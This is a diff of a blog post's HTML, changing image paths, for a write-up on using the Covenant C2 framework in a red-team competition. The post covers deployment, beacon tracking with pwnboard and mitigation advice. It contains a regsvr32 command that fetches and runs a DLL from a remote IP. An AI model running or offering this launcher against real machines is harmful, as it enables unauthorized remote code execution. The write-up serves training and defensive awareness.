@@ -201,7 +201,7 @@
 	<div class="avatar-container">
 	  <div class="avatar-img-border">
 	    <a href="http://localhost:4000">
-	      <img class="avatar-img" src="/img/covenant_redteaming/pwnboard_image.png" />
+	      <img class="avatar-img" src="/img/pwnboard_image.png" />
 		</a>
 	  </div>
 	</div>
@@ -282,12 +282,12 @@ ssh’d onto our server it would docker-compose up Elite for them.
 This meant they didn’t have to download docker-compose and would make
 things centralized.</p>
 
-<p><img src="/img/covenant_redteaming/plan.png" alt="Plan" /></p>
+<p><img src="/img/plan.png" alt="Plan" /></p>
 
 <h3 id="using-covenant">Using Covenant</h3>
 <p>Deployment was trivial all we had to do was docker-compose up.</p>
 
-<p><img src="/img/covenant_redteaming/easy_deployment.png" alt="Easy-Deployment" /></p>
+<p><img src="/img/easy_deployment.png" alt="Easy-Deployment" /></p>
 
 <p>In reality we would want to tack on -d when composing Covenant
 to background it.</p>
@@ -306,7 +306,7 @@ Luckily this is a oneliner that doesn’t require a restart.</p>
 is that we can have our server host the dll file instead of having to get that file
 on the target machine.</p>
 
-<p><img src="/img/covenant_redteaming/launcher.png" alt="Launcher" /></p>
+<p><img src="/img/launcher.png" alt="Launcher" /></p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll
 </code></pre></div></div>
@@ -326,7 +326,7 @@ One service that was critical is WinRM to allow us to remotely run
 scripts. Making sure it was running was quite simple with 
 Covenant.</p>
 
-<p><img src="/img/covenant_redteaming/example_powershell.png" alt="Restarting_Winrm" /></p>
+<p><img src="/img/example_powershell.png" alt="Restarting_Winrm" /></p>
 
 <p>Although, in most cases we had those commands in a powershell
 file hosted somewhere so we were able to simply do.</p>
@@ -371,7 +371,7 @@ One of the most important things is the <a href="https://github.com/micahjmartin
 The pwnboard is a visualization to keep track of what we have control of and to
 see what teams are giving us trouble.</p>
 
-<p><img src="/img/covenant_redteaming/pwnboard.png" alt="pwnboard-blue" /></p>
+<p><img src="/img/pwnboard.png" alt="pwnboard-blue" /></p>
 
 <p>To show that you have control of a box is a mere post request with
 json that contains the ip and type of beacon. There is one obvious problem,
@@ -379,7 +379,7 @@ Covenant doesn’t automatically do this. That’s ok I was planning on
 learning C#. After talking to the developer to figure out where to 
 make the post request to pwnboard whenever a Grunt was created.</p>
 
-<p><img src="/img/covenant_redteaming/post_topwnboard.PNG" alt="post_req" /></p>
+<p><img src="/img/post_topwnboard.PNG" alt="post_req" /></p>
 
 <p>This function is inside Covenant/GruntController.cs, 
 it just does a post request using the Grunt’s ip address 
@@ -391,11 +391,11 @@ for all of the boxes as well as the Regsvr32 launcher if possible.
 As we could prebake our stuff I was able to deploy to all of the boxes
 and watch the beacons rain down as well as turn the pwnboard red.</p>
 
-<p><img src="/img/covenant_redteaming/pwnboard_red.PNG" alt="pwnboard-red" /></p>
+<p><img src="/img/pwnboard_red.PNG" alt="pwnboard-red" /></p>
 
 <p>At the start of the competition these are just some of the beacons.</p>
 
-<p><img src="/img/covenant_redteaming/call_backs.PNG" alt="call_backs" /></p>
+<p><img src="/img/call_backs.PNG" alt="call_backs" /></p>
 
 <h3 id="mitigation">Mitigation</h3>
 
@@ -405,18 +405,18 @@ is out of the ordinary. For example if you’ve never seen
 Regsvr32 running on your system before it might be worthwhile
 to investigate and you would be shocked at what you find.</p>
 
-<p><img src="/img/covenant_redteaming/procexp_regsvr.png" alt="RegsvrImage" /></p>
+<p><img src="/img/procexp_regsvr.png" alt="RegsvrImage" /></p>
 
 <p>However, knowing what’s going in and out of your network is just as 
 important if you opened wireshark and noticed a lot of http
 traffic that would be highly suspicious.
 For example, if you noticed this http traffic.</p>
 
-<p><img src="/img/covenant_redteaming/http_traffic.png" alt="http-traffic" /></p>
+<p><img src="/img/http_traffic.png" alt="http-traffic" /></p>
 
 <p>Upon noticing this you followed the http stream you would notice this.</p>
 
-<p><img src="/img/covenant_redteaming/long-command.PNG" alt="encoded-command" /></p>
+<p><img src="/img/long-command.PNG" alt="encoded-command" /></p>
 
 <h3 id="take-aways">Take Aways</h3>
 
